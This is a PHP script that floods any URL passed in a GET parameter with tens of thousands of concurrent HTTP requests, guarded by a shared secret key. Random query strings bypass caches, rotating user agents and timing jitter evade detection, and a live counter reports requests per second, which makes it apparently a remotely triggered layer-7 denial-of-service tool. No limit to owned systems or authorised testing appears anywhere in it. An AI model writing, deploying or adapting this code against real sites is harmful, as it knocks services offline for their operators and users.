<?php
// --- CLEAN OUTPUT BUFFER ---
while (ob_get_level()) ob_end_clean();

// --- SECURITY (OPTIONAL BUT HIGHLY RECOMMENDED) ---
$secret_key = "mysecret"; // change this
if (!isset($_GET['key']) || $_GET['key'] !== $secret_key) {
    die("Unauthorized\n");
}

// --- DYNAMIC TARGET (OPTION 1) ---
$target_url = isset($_GET['target']) && filter_var($_GET['target'], FILTER_VALIDATE_URL)
    ? $_GET['target']
    : "https://google.com"; // fallback

// --- CONFIG ---
$concurrency = 10;
$total_batches = 10000;
$timeout = 5;

// --- TIMING / DELAY SETTINGS ---
$min_delay_us = 50000;        // 50ms
$max_delay_us = 200000;       // 200ms
$batch_delay_min = 100000;    // 100ms
$batch_delay_max = 500000;    // 500ms

set_time_limit(0);

// --- GLOBAL STATS ---
$total_requests = 0;
$total_success = 0;
$total_fail = 0;
$total_time = 0;

$start_time_global = microtime(true);

// --- RANDOM USER AGENTS ---
$user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)",
    "Mozilla/5.0 (Android 13; Mobile)"
];

echo "Target: $target_url\n";
echo "Concurrency: $concurrency | Batches: $total_batches\n\n";

for ($b = 0; $b < $total_batches; $b++) {

    $mh = curl_multi_init();
    $handles = [];

    // --- CREATE HANDLES ---
    for ($i = 0; $i < $concurrency; $i++) {

        $random_number = mt_rand(100000, 999999);
        $random_url = $target_url . "?" . $random_number;

        $ch = curl_init($random_url);

        // --- HEADERS ---
        $headers = [
            "Accept: text/html,application/xhtml+xml",
            "Accept-Language: en-US,en;q=0.9",
            "Cache-Control: no-cache",
            "Pragma: no-cache",
            "Connection: keep-alive"
        ];

        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_USERAGENT, $user_agents[array_rand($user_agents)]);

        // --- CONNECTION REUSE ---
        curl_setopt($ch, CURLOPT_FORBID_REUSE, false);
        curl_setopt($ch, CURLOPT_FRESH_CONNECT, false);

        curl_multi_add_handle($mh, $ch);
        $handles[] = $ch;

        // --- JITTER ---
        usleep(rand($min_delay_us, $max_delay_us));
    }

    // --- EXECUTE ---
    $running = null;
    do {
        curl_multi_exec($mh, $running);
        curl_multi_select($mh);
    } while ($running > 0);

    // --- COLLECT RESULTS ---
    foreach ($handles as $ch) {

        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $time_total = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
        $error = curl_error($ch);

        $total_requests++;
        $total_time += $time_total;

        if ($error || $http_code == 0) {
            $total_fail++;
        } elseif ($http_code >= 200 && $http_code < 400) {
            $total_success++;
        } else {
            $total_fail++;
        }

        curl_multi_remove_handle($mh, $ch);
        curl_close($ch);
    }

    curl_multi_close($mh);

    // --- CALCULATE STATS ---
    $elapsed = microtime(true) - $start_time_global;
    $rps = $elapsed > 0 ? $total_requests / $elapsed : 0;
    $avg_time = $total_requests > 0 ? $total_time / $total_requests : 0;

    // --- OUTPUT ---
    echo sprintf(
        "\rBatch %d/%d | Req:%d | OK:%d | FAIL:%d | Avg:%.3fs | RPS:%.2f",
        $b + 1,
        $total_batches,
        $total_requests,
        $total_success,
        $total_fail,
        $avg_time,
        $rps
    );

    flush();

    // --- BATCH DELAY ---
    usleep(rand($batch_delay_min, $batch_delay_max));
}

echo "\n\nDone!\n";
?>